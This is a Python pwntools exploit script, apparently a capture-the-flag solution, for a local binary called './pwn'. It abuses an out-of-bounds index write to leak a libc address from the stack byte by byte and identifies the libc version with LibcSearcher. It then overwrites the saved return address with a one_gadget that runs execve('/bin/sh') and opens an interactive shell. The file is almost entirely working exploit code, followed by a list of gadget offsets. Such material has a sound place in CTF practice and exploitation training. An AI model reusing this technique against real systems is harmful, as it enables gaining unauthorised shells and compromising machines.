#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./pwn
from pwn import *
from LibcSearcher import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


def input_index(idx):
    io.sendlineafter("input index\n", str(idx))


def get_value():
    io.recvuntil('now value(hex) ')
    return io.recvuntil('\n', drop=True)


def input_value(val):
    io.sendlineafter("input new value\n", str(val))


def set_cnt(cnt):
    off_cnt = -4
    input_index(off_cnt)
    val = int(get_value(), 16) & 0xff
    # log.info("now cnt: " + hex(val))
    # libc_main_231.append(hex(val))
    input_value(cnt)
    # log.info("reset cnt to: " + str(cnt+1))


###########
#  start  #
###########
io = start()
io.sendlineafter("name:", "test")

######################
#  get addr in libc  #
######################
buf_start = 0x00007fffffffd9a0
off_libcmain231 = 0x00007fffffffdc18 - buf_start

# libc_main_231 = []
addr_libc_main_231 = 0
for i in range(6):
    input_index(off_libcmain231 + i)
    val = int(get_value(), 16) & 0xff
    log.info("libc_main_231: " + hex(val))
    # libc_main_231.append(hex(val))
    addr_libc_main_231 += (val << (i*8))
    input_value(val)

# log.info(libc_main_231)
log.info("libc_main_231: " + hex(addr_libc_main_231))

############################################
#  using libcSearcher to get libc version  #
############################################
fn = '__libc_start_main'
obj = LibcSearcher(fn, addr_libc_main_231-231)
off_libc_start_main = obj.dump(fn)
log.info(f'offset of {fn}: ' + hex(off_libc_start_main))

###########################
#  set ret to one_gadget  #
###########################
off_ret = 0x00007fffffffdaf8 - buf_start
off_one_gadget = 0x4f2c5
addr_one_gadget =   addr_libc_main_231 \
                    - 231 \
                    - off_libc_start_main \
                    + off_one_gadget
for i in range(6):
    input_index(off_ret + i)
    get_value()
    input_value((addr_one_gadget >> i*8) & 0xff)
set_cnt(40)
io.interactive()

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ) [selected]
constraints:
    rsp & 0xf == 0
    rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
    [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
    [rsp+0x70] == NULL
'''

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
